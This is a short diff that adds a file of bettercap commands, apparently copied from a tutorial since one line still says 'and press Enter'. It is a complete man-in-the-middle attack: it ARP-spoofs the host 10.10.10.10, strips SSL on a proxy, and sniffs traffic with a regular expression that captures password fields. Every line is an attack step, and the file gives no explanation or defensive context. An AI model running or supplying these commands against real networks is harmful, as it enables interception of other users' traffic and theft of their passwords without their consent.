@@ -1,0 +1,11 @@
+bettercap -iface eth0 
+net.probe on 
+net.recon 
+net.sniff on 
+set http.proxy.sslstrip true and press Enter
+set arp.spoof.internal true 
+set arp.spoof.targets 10.10.10.10 
+http.proxy on 
+arp.spoof on 
+net.sniff on 
+set net.sniff.regexp ‘.*password=.+’ 
